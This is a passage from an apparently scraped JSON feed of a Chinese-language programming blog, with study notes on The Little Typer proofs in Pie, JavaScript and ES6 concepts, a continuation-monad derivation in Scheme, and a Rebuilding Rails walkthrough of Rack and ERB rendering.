(-\u0026gt; (= Nat a b) (=cases a b)))) (define use-Nat= (λ (a b) (λ (a=b) (replace a=b ;; 不管是不是真的有就先replace =cases出來的值就對了， (λ (x) (=cases a x)) (=cases-same a))))) (claim 0!=n+1 (Pi ((n Nat)) (-\u0026gt; (= Nat 0 (add1 n)) Absurd))) (define 0!=n+1 (λ (n) (use-Nat= 0 (add1 n)))) 1-!=-6 (claim dount-absurdity (-\u0026gt; (= Nat 0 6) (= Atom \u0026#39;hi \u0026#39;wow))) (define dount-absurdity (λ (0=6) (ind-Absurd (0!=n+1 5 0=6) (= Atom \u0026#39;hi \u0026#39;wow)))) (claim sub1= (Pi ((n Nat) (j Nat)) (-\u0026gt; (= Nat (add1 n) (add1 j)) (= Nat n j)))) (define sub1= (λ (n j) ;; (= Nat (add1 n) (add1 j)) 在 =cases 有!! ;; 而 use-Nat= 可以生出 =cases (use-Nat= (add1 n) (add1 j)))) (claim 1-!=-6 (-\u0026gt; (= Nat 1 6) Absurd)) (define 1-!=-6 (λ (1=6) ;; 這裡就是假設有1=6這東西的地方(歸謬法) ((use-Nat= 0 5) ((sub1= 0 5) 1=6)))) front (claim front (Pi ((A U) (n Nat)) (-\u0026gt; (Vec A (add1 n)) A))) ;; 這邊無法寫成(-\u0026gt; (Vec A n) A))，因為有要求證明(= Nat n (add1 l))，會強迫把claim改成(-\u0026gt; (Vec A (add1 n)) A))) (define front (λ (A n) (λ (v) ((ind-Vec (add1 n) v (λ (n v) (Pi ((l Nat)) (-\u0026gt; (= Nat n (add1 l)) A))) ;; 要求當前的n必須至少大於1(是某個有1的數字) (λ (l) (λ (0=otherNat) (ind-Absurd (0!=n+1 l 0=otherNat) ;; 假設有0=otherNat的proof，來拉出Absurd A))) (λ (n a v-1) (λ (ret) (λ (l proofWhichWeDontNeed) a)))) n (same (add1 n)))))) 排中律(pem，principle excluded middle) 沒有直接的proof說他是對的或錯的 但我們可證明pem不是不對的\n當初用natural deduction在那邊想很久也沒寫出來，看了解答也是wtf(疑惑) 如今看這個也是wtf(讚嘆)\n(claim pem-not-false (Pi ((A U)) (-\u0026gt; (-\u0026gt; (Either A (-\u0026gt; A Absurd)) Absurd) Absurd))) (define pem-not-false (λ (A) (λ (!PEM) (!PEM (right ;; (1) ?? (λ (a) ;; WTF 幹，我們有A的value了 ;; 教訓: 要有function type才有相對應的值 ;; 值的產生方式: 1. 直接造 2. 從function拉出來 (而function也是值，所以也可以直接造或從function拉出來) (!PEM (left a)))))))) decidable : function that decides whether they are true or false (claim Dec (-\u0026gt; U U)) (define Dec (λ (X) (Either X (-\u0026gt; X Absurd)))) (claim zero? (Pi ((n Nat)) (Dec (= Nat 0 n)))) (define zero? (λ (n) (ind-Nat n (λ (x) (Dec (= Nat 0 x))) (left (same 0)) (λ (n-1) (λ (ret) (right (0!=n+1 n-1))))))) nat=? (claim ?orez (Pi ((n Nat)) (Dec (= Nat n 0)))) (define ?orez (λ (n) (ind-Nat n (λ (x) (Dec (= Nat x 0))) (left (same 0)) (λ (n-1) (λ (ret) (right (n+1!=0 n-1))))))) (claim nat=? (Pi ((a Nat) (b Nat)) (Dec (= Nat a b)))) (define nat=? (λ (a b) ((ind-Nat a (λ (k) (Pi ((x Nat)) (Dec (= Nat k x)))) (λ (j) (zero? j)) (λ (a-1) (λ (ret) (λ (j) (ind-Nat j (λ (k) (Dec (= Nat (add1 a-1) k))) (?orez (add1 a-1)) (λ (j-1) (λ (ret2) (ind-Either (ret j-1) (λ (x) (Dec (= Nat (add1 a-1) (add1 j-1)))) (λ (lhs) (left (cong lhs (+ 1)))) (λ (rhs) (right (λ (a=j) (rhs (sub1= a-1 j-1 a=j))))))))))))) b))) TODO The Way Forward Rules are made to be spoken 等看過了\nPractical Foundations for Programming Languages, Types and Programming Languages, Semantics Engineering with PLT Redex. \u0026lt;= Prefer this\n其中一本再說\n","permalink":"https://littlebees.github.io/2020/05/little-typer-%E5%BE%8C%E7%AF%878~16-%E6%95%B4%E7%90%86%E8%88%87%E7%AD%86%E8%A8%98/","summary":"來證明啦\nch8 \u0026amp; ch9 \u0026amp; ch10 \u0026amp; ch11 現在說用type證明，但實際上怎麼做?\n在claim寫下想證的東西，在define證出來\nincr \u0026amp; + (claim incr (-\u0026gt; Nat Nat)) (define incr (λ (n) (iter-Nat n 1 (+ 1)))) (claim + (-\u0026gt; Nat Nat Nat)) (define + (λ (a b) (iter-Nat a b (λ (ret) (add1 ret))))) +1=add1 證對於任何整數，add1等於+1\n(claim +1=add1 (Pi ((n Nat)) (= Nat (+ 1 n) (add1 n)))) 所以我們需要一個value的type是(= Nat (+ 1 n) (add1 n))) 先把1帶入+中，會發現根本就是(add1 n)\n也就是兩邊都一樣，same!!\n(define +1=add1 (λ (n) (same (+ 1 n)))) incr=add1 同樣的來試試incr=add1","title":"little typer 後篇(8~16) 整理與筆記"},{"content":"介紹Pie怎麼用\nch1 \u0026amp; ch2 \u0026amp; ch3 所有東西都是expression 有人斷言expression有某種屬性或與其他expression有共通的特質是judgment Sentences get their meaning from those who understand them. The sentences capture thoughts that we have, and thoughts are more important than the words we use to express them. 描述某一群expression的expression是Type 當type constructor在頂部就是type (Pair Nat Nat) constructor在頂部就是Value constructor會產生某個type的實體(像add1會產生Nat的實體，8也是Nat的實體) eliminator會分解value取出構成value的資訊 當某一expression無法再被改寫時叫normal form 改寫expression叫evaluation expression因為有變數而無法繼續改寫叫neutral 只要長的一樣就是same (不是等於，之後會用same去證等於) total function對任何一個值都能產生對應的值 沒有遞迴 因為每個expression都一定要收斂 所以有其他東西來做類似的效果 evaluation \u0026amp; value 在dependent type中，evaluation得到的是expression 在一般PL(像lisp)中，evaluation得到的是value 在一般PL中，expression與value是不同類別的東西\nch4 \u0026amp; ch5 claim \u0026amp; define 在pie中要產生一個變數要先claim再define\n(claim one Nat) (define one (add1 0)) 函數的部分用(-\u0026gt; arg1 arg2 ... ret)宣告 函數或是需要type作為參數用(Pi ((arg1 type1) (arg2 type2) ...)) ...)宣告\nlen ;; 原本 (define (len l) (if (null? l) 0 (add1 (len (cdr l))))) ;; now (claim len (Pi ((T U)) ;; U是Universe，意指所有的type(但不包含自己) (-\u0026gt; (List T) Nat))) (define len (λ (T l) ;; Pie的lambda會自己curry (rec-List l 0 (λ (car_L cdr_L ret) ;; rec-{type}會把做遞迴的參數分解，以及把ret塞回來，可以想成backtrace的部分 (add1 ret))))) 還有其他老朋友，但就先跳過\nch6 \u0026amp; ch7 vector與list很像，但有長度在type中\nfirst (claim first (Pi ((T U) (n Nat)) (-\u0026gt; (Vec T n) T))) (define first (λ (T n v) (head v))) 這個傳空的就會出事\n可以改宣告，限制只吃只少有一個的vec\n(claim first (Pi ((T U) (n Nat)) (-\u0026gt; (Vec T (add1 n)) T))) (define first (λ (T n v) (head v))) last 原本rec-List或rec-Nat都是回傳type不變的值，但現在vec有長度，所以會變!!\n對此我們要ind-Nat，意思是對整數做歸納法 ind-Nat多了一個東西是motive，函數，會吃一個正在做歸納法的值，回傳應該有的type\n而motive也於ind-Nat其他部位有關係\n(claim last (Pi ((T U) (n Nat)) (-\u0026gt; (Vec T (add1 n)) T))) (define last (λ (T n v) (ind-Nat n (λ (x) (-\u0026gt; (Vec T (add1 x)) T)) (λ (v1) (head v1)) (λ (n-1 ret) ;; 有沒有覺得與rec-Nat有點像 (λ (v) (ret (tail v))))))) (claim last-motive (-\u0026gt; U Nat U)) (define last-motive (λ (T) (λ (n) (-\u0026gt; (Vec T (add1 x)) T)))) ;; 把last的Pi的參數拿掉剩下就是我們要的 (claim last-base (Pi ((T U)) (last-motive T 1))) ;; 原本應該是0，但已經限制要大於1 (claim last-step (Pi ((T U) (n Nat)) (-\u0026gt; (last-motive T n) ;; 吃舊的值(n-1,或是叫他回傳值) (last-motive T (add1 n))))) ;; 丟新的值 (define last-base (λ (T v) (head v))) (define last-step (λ (T) (λ (n-1 ret) (λ (v) (ret (tail v)))))) (define last (λ (T v) (ind-Nat v (last-motive T) (last-base T) (last-step T)))) 到這裡基本的Pie已經說完了，剛剛last有寫兩個版本，重要的是理解ind-Nat的motive與motive是怎麼與其他ind-Nat的部位有關係的\n","permalink":"https://littlebees.github.io/2020/05/little-typer-%E5%89%8D%E7%AF%871~7-%E6%95%B4%E7%90%86%E8%88%87%E7%AD%86%E8%A8%98/","summary":"介紹Pie怎麼用\nch1 \u0026amp; ch2 \u0026amp; ch3 所有東西都是expression 有人斷言expression有某種屬性或與其他expression有共通的特質是judgment Sentences get their meaning from those who understand them. The sentences capture thoughts that we have, and thoughts are more important than the words we use to express them. 描述某一群expression的expression是Type 當type constructor在頂部就是type (Pair Nat Nat) constructor在頂部就是Value constructor會產生某個type的實體(像add1會產生Nat的實體，8也是Nat的實體) eliminator會分解value取出構成value的資訊 當某一expression無法再被改寫時叫normal form 改寫expression叫evaluation expression因為有變數而無法繼續改寫叫neutral 只要長的一樣就是same (不是等於，之後會用same去證等於) total function對任何一個值都能產生對應的值 沒有遞迴 因為每個expression都一定要收斂 所以有其他東西來做類似的效果 evaluation \u0026amp; value 在dependent type中，evaluation得到的是expression 在一般PL(像lisp)中，evaluation得到的是value 在一般PL中，expression與value是不同類別的東西\nch4 \u0026amp; ch5 claim \u0026amp; define 在pie中要產生一個變數要先claim再define","title":"little typer 前篇(1~7) 整理與筆記"},{"content":"caller: block \u0026amp; nonblock caller會等 =\u0026gt; block caller不等 =\u0026gt; nonblock (所以要自己時不是去確認好了沒，或是，callee通知)\nreturn val: (general\u0026rsquo;s) sync \u0026amp; async 調用後會拿到 sync: 我們想要的資料 async: 類似raincheck的東西，也許馬上，也許要一段時間後，才會拿到我們想要的資料\n要不要自己把copy到userspace的io做完: (NP\u0026rsquo;s) sync \u0026amp; async 前面4種都是最後要自己call system call拉資料，所以是sync，最後user與kernel的任務會同時完成\nasync io是user連什麼時候完成都不知道，等到kernel把資料copy好就會call callback\nAJAX var httpRequest = httpRequest = new XMLHttpRequest(); httpRequest.onreadystatechange = function() { // 等狀態變成請求完成狀態 if (httpRequest.readyState === 4 \u0026amp;\u0026amp; httpRequest.status == 200) { httpRequest.responseText } alert(`ERROR - server status code: ${httpRequest.status} xdr status: ${httpRequest.readyState}`); }; httpRequest.open(\u0026#39;GET\u0026#39;, \u0026#39;/api/get_something\u0026#39;); httpRequest.send(null); httpRequest.open(\u0026#39;POST\u0026#39;, \u0026#39;/api/test.php\u0026#39;); httpRequest.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;); // 注意CORS httpRequest.send(`name=value\u0026amp;anothername=${encodeURIComponent(myVar)}\u0026amp;so=on`); fetch API function postData(url, data) { // Default options are marked with * return fetch(url, { body: JSON.stringify(data), // must match \u0026#39;Content-Type\u0026#39; header, and data can be `string` or {object}! cache: \u0026#39;no-cache\u0026#39;, // *default, no-cache, reload, force-cache, only-if-cached credentials: \u0026#39;same-origin\u0026#39;, // include, same-origin, *omit headers: { \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/4.0 MDN Example\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; }, method: \u0026#39;POST\u0026#39;, // *GET, POST, PUT, DELETE, etc. mode: \u0026#39;cors\u0026#39;, // no-cors, cors, *same-origin redirect: \u0026#39;follow\u0026#39;, // manual, *follow, error referrer: \u0026#39;no-referrer\u0026#39;, // *client, no-referrer credentials: \u0026#39;omit\u0026#39;, // same-origin, include }) .then(response =\u0026gt; response.json()) // 輸出成 json } formdata var formData = new FormData(); var fileField = document.querySelector(\u0026#34;input[type=\u0026#39;file\u0026#39;]\u0026#34;); formData.append(\u0026#39;username\u0026#39;, \u0026#39;abc123\u0026#39;); formData.append(\u0026#39;avatar\u0026#39;, fileField.files[0]); custom headers var myHeaders = new Headers(); myHeaders = new Headers({ \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34;, \u0026#34;Content-Length\u0026#34;: content.length.toString(), \u0026#34;X-Custom-Header\u0026#34;: \u0026#34;ProcessThisImmediately\u0026#34;, }); myHeaders.append(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/plain\u0026#34;); custom request var myInit = { method: \u0026#39;GET\u0026#39;, headers: myHeaders, mode: \u0026#39;cors\u0026#39;, cache: \u0026#39;default\u0026#39; }; var myRequest = new Request(\u0026#39;flowers.jpg\u0026#39;, myInit); fetch(myRequest).then(function(response) { return response.blob(); }).then(function(myBlob) { var objectURL = URL.createObjectURL(myBlob); myImage.src = objectURL; }); Ref MDN 比較general的sync 比較np的sync\n","permalink":"https://littlebees.github.io/2020/05/%E5%9C%A8%E4%B8%8D%E5%90%8Ccontext%E4%B8%8B%E7%9A%84sync%E8%88%87async%E8%88%87blocknon-block%E6%AF%94%E8%BC%83/","summary":"caller: block \u0026amp; nonblock caller會等 =\u0026gt; block caller不等 =\u0026gt; nonblock (所以要自己時不是去確認好了沒，或是，callee通知)\nreturn val: (general\u0026rsquo;s) sync \u0026amp; async 調用後會拿到 sync: 我們想要的資料 async: 類似raincheck的東西，也許馬上，也許要一段時間後，才會拿到我們想要的資料\n要不要自己把copy到userspace的io做完: (NP\u0026rsquo;s) sync \u0026amp; async 前面4種都是最後要自己call system call拉資料，所以是sync，最後user與kernel的任務會同時完成\nasync io是user連什麼時候完成都不知道，等到kernel把資料copy好就會call callback\nAJAX var httpRequest = httpRequest = new XMLHttpRequest(); httpRequest.onreadystatechange = function() { // 等狀態變成請求完成狀態 if (httpRequest.readyState === 4 \u0026amp;\u0026amp; httpRequest.status == 200) { httpRequest.responseText } alert(`ERROR - server status code: ${httpRequest.status} xdr status: ${httpRequest.readyState}`); }; httpRequest.open(\u0026#39;GET\u0026#39;, \u0026#39;/api/get_something\u0026#39;); httpRequest.","title":"在不同context下的sync與async(與block\u0026non-block比較)"},{"content":"下面是個人比較喜歡的es6的新特性\n終於來了!! Template Literals `Fifteen is ${a + b} and not ${2 * a + b}.` Arrow Functions function Person() { this.age = 0; // var self = this; // 定義該 Arrow Functions 時的環境，是在 Person 物件中 setInterval(() =\u0026gt; { // 所以 this 會正確指向 Person 物件 this.age++; //self.age++ }, 1000); } var p = new Person(); class syntax sugar class Animal { constructor(name) { this.name = name; } speak() { console.log(this.name + \u0026#39; makes a noise.\u0026#39;); } static triple(n) { if (n === undefined) { n = 1; } return n * 3; } } class Dog extends Animal { constructor(name) { super(name) this.name = name; } speak() { super.speak() // this會用到子類別的obj console.log(this.name + \u0026#39; barks.\u0026#39;); } static triple(n) { return super.triple(n) * super.triple(n); } } var d = new Dog(\u0026#39;Mitzie\u0026#39;); // 顯示 Mitzie barks. d.speak(); import \u0026amp; export // export [default] \u0026lt;exp with var\u0026gt; // var ..., function, class export { encrypt }; export { decrypt as dec }; import {aString, aObject, aFunction, aClass} from \u0026#39;./lib.js\u0026#39; import * as myModule from \u0026#39;./lib.js\u0026#39; 有趣的特性 Computed property keys var prefix = \u0026#39;es6\u0026#39;; var obj = { // 計算屬性 [prefix + \u0026#39; is\u0026#39;]: \u0026#39;cool\u0026#39;, // 計算方法 [prefix + \u0026#39; score\u0026#39;]() { console.log(100); } }; // 顯示 cool console.log(obj[\u0026#39;es6 is\u0026#39;]); // 顯示 100 obj[\u0026#39;es6 score\u0026#39;](); preteier \u0026amp; eslint preteier =\u0026gt; 讓code好看 eslint =\u0026gt; 檢查coding style\nvscode設定 prettier ESLint eslint-config-airbnb Prettier-eslint 用上面三個plugin後，先跑prettier再跑ESLint 如果只想用一個指令(prettier,eslint)而已，請看Ref1 Ref1 Ref2\n","permalink":"https://littlebees.github.io/2020/05/%E6%9C%89%E8%B6%A3%E8%88%87%E6%9C%89%E7%94%A8%E7%9A%84es6%E7%89%B9%E6%80%A7/","summary":"下面是個人比較喜歡的es6的新特性\n終於來了!! Template Literals `Fifteen is ${a + b} and not ${2 * a + b}.` Arrow Functions function Person() { this.age = 0; // var self = this; // 定義該 Arrow Functions 時的環境，是在 Person 物件中 setInterval(() =\u0026gt; { // 所以 this 會正確指向 Person 物件 this.age++; //self.age++ }, 1000); } var p = new Person(); class syntax sugar class Animal { constructor(name) { this.name = name; } speak() { console.log(this.name + \u0026#39; makes a noise.","title":"有趣與有用的es6特性"},{"content":"把參數藏起來 把acc藏起來看看\n(define (sum l acc) (if (null? l) acc (sum (cdr l) (+ acc (car l))))) delay 要藏的變數 (define (sum1 l) (lambda (acc) (if (null? l) acc ((sum2 (cdr l)) (+ (car l) acc))))) 把lambda推到if的兩項 (define (sum2 l) (if (null? l) (lambda (acc) acc) (lambda (acc) ((sum2 (cdr l)) (+ (car l) acc))))) 抽出遞迴的part (define (sum3 l) (if (null? l) (lambda (acc) acc) (let ((m (sum3 (cdr l)))) (lambda (acc) (m (+ (car l) acc)))))) 把運算抽出來，並把delay的變數塞回去 (define (sum4.5 l) (if (null? l) (lambda (acc) acc) (let ((m (sum4 (cdr l))) (f (lambda (acc) (+ (car l) acc)))) ;; maybe use -(minus), i could spot out this error (lambda (acc) (f (m acc)))))) ;; recursive ;; 這邊變成了先遞迴，等回來再做f ;; 當初自己推導是先寫出這個的!! WHYYYYY (define (sum4 l) (if (null? l) (lambda (acc) acc) (let ((m (sum4 (cdr l))) (f (lambda (acc) (+ (car l) acc)))) (lambda (acc) (m (f acc)))))) ;; iterative 番外篇: 左右遞迴 (define (sub4 l) (if (null? l) (lambda (acc) acc) (let ((m (sub4 (cdr l))) (f (lambda (acc) (- (car l) acc)))) (lambda (acc) (m (f acc)))))) ;; iterative, foldl (define (sub5 l) (if (null? l) (lambda (acc) acc) (let ((m (sub5 (cdr l))) (f (lambda (acc) (- (car l) acc)))) (lambda (acc) (f (m acc)))))) ;; recursive, foldr ((sub4 \u0026#39;(2 3 1 4)) 6) =\u0026gt; 10 2 - 6 = -4 3 - -4 = 7 1 - 7 = -6 4 - -6 = 10 ((sub5 \u0026#39;(2 3 1 4)) 6) =\u0026gt; 2 4 - 6 = -2 1 - -2 = 3 3 - 3 = 0 2 - 0 = 2 藏 continuation 現在用同樣的方式藏continuation\n(define (sum-k l k) (if (null? l) (k 0) (sum-k (cdr l) (lambda (ret) (k (+ (car l) ret)))))) (define (sum-k2 l) (if (null? l) (lambda (k) (k 0)) (lambda (k) ((sum-k2 (cdr l)) (lambda (ret) (k (+ (car l) ret))))))) (define (sum-k3 l) (if (null? l) (lambda (k) (k 0)) (let ((m (sum-k3 (cdr l)))) (lambda (k) (m (lambda (ret) (k (+ (car l) ret)))))))) (define (sum-k4 l) (if (null? l) (lambda (k) (k 0)) (let ((m (sum-k3 (cdr l))) (f (lambda (ret) (lambda (k) (k (+ (car l) ret)))))) (lambda (k) ((m f) k))))) ;; NOOOOO!!! f should contains k before m (define (sum-k4 l) (if (null? l) (lambda (k) (k 0)) (let ((m (sum-k4 (cdr l))) (f (lambda (ret) (lambda (k) (k (+ (car l) ret)))))) (lambda (k) (m (lambda (v) ((f v) k)))))) cont monad (define (bind m f) (lambda (k) (m (lambda (v) ((f v) k))))) (define (return v) (lambda (k) (k v))) (define (sum\u0026#39; l) (callcc (lambda (exit) (cond ((null? l) (return 0)) (else (bind (sum\u0026#39; (cdr l)) (lambda (ret) (lambda (k) (k (+ ret (car l))))))))))) callcc (define (callcc f) (λ (k) ((f (λ (ret) ;; 要跳出去時，會先收到值 (λ (_) ;; 原本接下來要做的事 (k ret)))) ;; 直接用之前的 k))) ;; 用之前的 ","permalink":"https://littlebees.github.io/2020/05/monad%E6%8E%A8%E5%B0%8E%E4%B8%BB%E8%A6%81%E6%98%AFcont-monad/","summary":"把參數藏起來 把acc藏起來看看\n(define (sum l acc) (if (null? l) acc (sum (cdr l) (+ acc (car l))))) delay 要藏的變數 (define (sum1 l) (lambda (acc) (if (null? l) acc ((sum2 (cdr l)) (+ (car l) acc))))) 把lambda推到if的兩項 (define (sum2 l) (if (null? l) (lambda (acc) acc) (lambda (acc) ((sum2 (cdr l)) (+ (car l) acc))))) 抽出遞迴的part (define (sum3 l) (if (null? l) (lambda (acc) acc) (let ((m (sum3 (cdr l)))) (lambda (acc) (m (+ (car l) acc)))))) 把運算抽出來，並把delay的變數塞回去 (define (sum4.","title":"monad推導，主要是cont monad"},{"content":"hoisting console.log(a) var a = 10 會變成類似(會說是類似，因為底層不一定是這樣做)\nvar a console.log(a) a = 10 可以把他\nvar a = \u0026#39;1\u0026#39; // A... var b = 2 // B ... var c 想像成這樣\nfunction whatever(a,b,c) { // A ... // B ... }(\u0026#39;1\u0026#39;,1,undefined); 如果有let\nvar a = \u0026#39;1\u0026#39; function x() { // a ... let a = 2 } 先想像成\nfunction whatever(a) { function x() { // a ... let a = 2 // b ... } }(\u0026#39;1\u0026#39;) 再想像成let會把前面提到同樣變數砍掉，在let的地方展開成function apply\nvar a = \u0026#39;1\u0026#39; function whatever() { function x() { // a ... function whatever2(a) { // b ... }(2) } }(\u0026#39;1\u0026#39;) 在Scheme怎麼處理mutual recursion? 據說當初JS有hoisting是為了方便寫mutual recursion。 先不說mutual recursion平常很少用到，先來看看scheme(或ML家族語言)是如何處理mutual recursion\n有一個東西叫letrec\n(letrec [(even? (lambda (x) (if (zero? x) #t (odd? (- x 1))))) (odd? (lambda (x) (if (zero? x) #f (even? (- x 1)))))] even?) 在這個範圍都是可以互相參照的，個人比較偏好這種方式啦\n例子 (function() { var a = b = 5; })(); console.log(b); b會是global!! 所以印出5\n同理\nfor (var i=0;i\u0026lt;10;i++) console.log(i) console.log(i) 最後會是10\n還有function也會hoisting\nfunction test() { console.log(a); console.log(foo()); var a = 1; function foo() { return 2; } } test() 會印 undefined 2\nRef 很詳細的文章\nbuiltin type string 是 Immutable 字面常數是value type new的是reference type 字面常數與new出來的不同 字面常數不能加method上去 var s = \u0026#39;abc\u0026#39;; var s2 = s.slice(); // \u0026#39;abc\u0026#39; (a clone) s == s2 // true var s3 = new String(s); // object var s4 = new String(s); // object s3 == s4 // false // 用 === 從可怕的隱式轉換拯救自己 undefined就是undefined(c的void)\nnull是object\nfalsy value\nfalse 0 '' null undefined NaN \u0026#39;\u0026#39; == \u0026#39;0\u0026#39; // false \u0026#39;\u0026#39; == 0 // true \u0026#39;0\u0026#39; == 0 // true \u0026#39; \\t\\r\\n\u0026#39; == 0 // true false == \u0026#39;false\u0026#39; // false false == 0 // true false == undefined // false false == null // false null == undefined // true NaN == NaN // false event bubbling 從樹根往下走，走到終點，只有終點的事件，會執行冒泡與捕獲的事件，其他都是看在什麼階段就執行什麼階段的事件。\n如果是終點有設定冒泡與捕獲的事件，那事件的執行順序，就看當初加入事件的順序\n斬斷鎖鏈 e.stopPropagation (單體攻擊) // list 的捕獲 $list.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { console.log(\u0026#39;list capturing\u0026#39;); e.stopPropagation(); // \u0026lt;--- 這邊這事件就不會繼續下去 }, true) // list 的捕獲 2 $list.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { console.log(\u0026#39;list capturing2\u0026#39;); // \u0026lt;--- 這邊 會 繼續下去 }, true) e.stopImmediatePropagation (AOE) // list 的捕獲 $list.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { console.log(\u0026#39;list capturing\u0026#39;); e.stopImmediatePropagation(); // \u0026lt;--- 會讓同一層的所有事件停止 }, true) // list 的捕獲 2 $list.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { console.log(\u0026#39;list capturing2\u0026#39;); }, true) e.preventDefault (AOE ver.針對browser) // list_item_link 的冒泡 $list_item_link.addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { e.preventDefault(); }, false) 當點超連結的時候，就不會執行原本預設的行為（新開分頁或是跳轉），而是沒有任何事情發生。\nprototype \u0026amp; interface function newObj(Constructor, arguments) { var o = new Object(); // 讓 o 繼承原型鍊 o.__proto__ = Constructor.prototype; // 執行建構函式 Constructor.apply(o, arguments); // 回傳建立好的物件 return o; } 可以想像成Constructor.prototype是class變數與方法的env __proto__就是parent的指標 用apply完成填值的動作\n另外，apply與call都是差不多的東西，只是一個是放參數列，一個是給array bind就是會先綁定this成某個Object，只後丟出function\n","permalink":"https://littlebees.github.io/2020/04/js%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5%E7%9A%84%E6%95%B4%E7%90%86/","summary":"hoisting console.log(a) var a = 10 會變成類似(會說是類似，因為底層不一定是這樣做)\nvar a console.log(a) a = 10 可以把他\nvar a = \u0026#39;1\u0026#39; // A... var b = 2 // B ... var c 想像成這樣\nfunction whatever(a,b,c) { // A ... // B ... }(\u0026#39;1\u0026#39;,1,undefined); 如果有let\nvar a = \u0026#39;1\u0026#39; function x() { // a ... let a = 2 } 先想像成\nfunction whatever(a) { function x() { // a ... let a = 2 // b .","title":"JS一些概念的整理"},{"content":"Ch1 Zero to “It Works!” Gem的檔案結構 $ bundle gem rulers create rulers/Gemfile create rulers/Rakefile create rulers/LICENSE.txt create rulers/README.md create rulers/.gitignore create rulers/rulers.gemspec # !! create rulers/lib/rulers.rb # !! create rulers/lib/rulers/version.rb Initializating git repo in src/rulers rulers/rulers.gemspec放的是gem的資訊與dependency\nrulers/lib/rulers.rb就是主程式\ndependency分成development與runtime # rulers.gemspec gem.add_development_dependency \u0026#34;rspec\u0026#34; gem.add_runtime_dependency \u0026#34;rest-client\u0026#34; rack進入點 與 rack app回傳值的資料結構 # best_quotes/config.ru run proc { [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [\u0026#34;Hello, world!\u0026#34;]] } 狀態值,header,資料\nrack app 的 interface # rulers/lib/rulers.rb require \u0026#34;rulers/version\u0026#34; module Rulers class Application def call(env) [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [\u0026#34;Hello from Ruby on Rulers!\u0026#34;]] end end end 要有call的method，吃的是來自rack的env\nnew是編譯期的args，call是runtime的args # best_quotes/config.ru require \u0026#39;./config/application\u0026#39; run BestQuotes::Application.new Ch2 Your First Controller # rulers/lib/rulers.rb require \u0026#34;rulers/version\u0026#34; require \u0026#34;rulers/routing\u0026#34; module Rulers class Application def call(env) klass, act = get_controller_and_action(env) controller = klass.new(env) text = controller.send(act) [200, {\u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#39;text/html\u0026#39;}, [text]] end def get_controller_and_action(env) _, cont, action, after = env[\u0026#34;PATH_INFO\u0026#34;].split(\u0026#39;/\u0026#39;, 4) cont = cont.capitalize # \u0026#34;People\u0026#34; cont += \u0026#34;Controller\u0026#34; # \u0026#34;PeopleController\u0026#34; [Object.const_get(cont), action] end end class Controller def initialize(env) @env = env end def env @env end end end 觀察 get_controller_and_action :: env -\u0026gt; (Class, Symbol) Controller :: env -\u0026gt; obj(一堆action) Ch3 Rails Automatic Loading const_missing class Object def self.const_missing(c) require \u0026#34;./bobo\u0026#34; Bobo end end Bobo.new.print_bobo CamelCase and snake_case # rulers/lib/rulers/util.rb module Rulers def self.to_underscore(string) string.gsub(/::/, \u0026#39;/\u0026#39;). gsub(/([A-Z]+)([A-Z][a-z])/,\u0026#39;\\1_\\2\u0026#39;). gsub(/([a-z\\d])([A-Z])/,\u0026#39;\\1_\\2\u0026#39;). tr(\u0026#34;-\u0026#34;, \u0026#34;_\u0026#34;). downcase end end auto-load # rulers/lib/rulers/dependencies.rb class Object def self.const_missing(c) require Rulers.to_underscore(c.to_s) Object.const_get(c) end end # best_quotes/config/application.rb require \u0026#34;rulers\u0026#34; $LOAD_PATH \u0026lt;\u0026lt; File.join(File.dirname(__FILE__),\u0026#34;..\u0026#34;, \u0026#34;app\u0026#34;,\u0026#34;controllers\u0026#34;) #require要的 # --\u0026gt; No more require here! \u0026lt;-- module BestQuotes class Application \u0026lt; Rulers::Application end end Ch4 Rendering Views erb # some_directory/erb_test.rb require \u0026#34;erubis\u0026#34; template = \u0026lt;\u0026lt;TEMPLATE Hello! This is a template. It has \u0026lt;%= whatever %\u0026gt;. TEMPLATE eruby = Erubis::Eruby.new(template) puts eruby.src puts \u0026#34;==========\u0026#34; puts eruby.result(:whatever =\u0026gt; \u0026#34;ponies!\u0026#34;) _buf = \u0026#39;\u0026#39;; _buf \u0026lt;\u0026lt; \u0026#39;Hello! This is a template. It has \u0026#39;; _buf \u0026lt;\u0026lt; ( whatever ).to_s; _buf \u0026lt;\u0026lt; \u0026#39;.\u0026#39;; _buf.to_s ==========\nHello! This is a template. It has ponies!. render # rulers/lib/rulers/controller.rb (excerpt) def render(view_name, locals = {}) filename = File.join \u0026#34;app\u0026#34;, \u0026#34;views\u0026#34;,\u0026#34;#{view_name}.html.erb\u0026#34; template = File.read filename eruby = Erubis::Eruby.new(template) eruby.result locals.merge(:env =\u0026gt; env) end locals是controller的資料 env是來自rack的資料\n觀察 parse -\u0026gt; proc having lots of string -\u0026gt; eval -\u0026gt; string Ch5 Basic Models skip\nCh6 Request, Response Request module Rulers class Controller def request @request ||= Rack::Request.new(@env) end def params request.params end end end 從 env 得到 Request 再從中得到 params\nResponse module Rulers class Controller #private def response(text, status = 200, headers = {}) raise \u0026#34;Already responded!\u0026#34; if @response a = [text].flatten @response = Rack::Response.new(a, status, headers) end def render(view_name, locals = {}) filename = File.join \u0026#34;app\u0026#34;, \u0026#34;views\u0026#34;,\u0026#34;#{view_name}.html.erb\u0026#34; template = File.read filename eruby = Erubis::Eruby.new(template) eruby.result locals.merge(:env =\u0026gt; env) end #public def get_response # Only for Rulers @response end def render_response(*args) response(render(*args)) end end end response產生three tuple，就是rack app真正要回傳的東西\nCh7 The Littlest ORM Migration 之後，DB做事之前 # best_quotes/mini_migration.rb require \u0026#34;sqlite3\u0026#34; conn = SQLite3::Database.new \u0026#34;test.db\u0026#34; 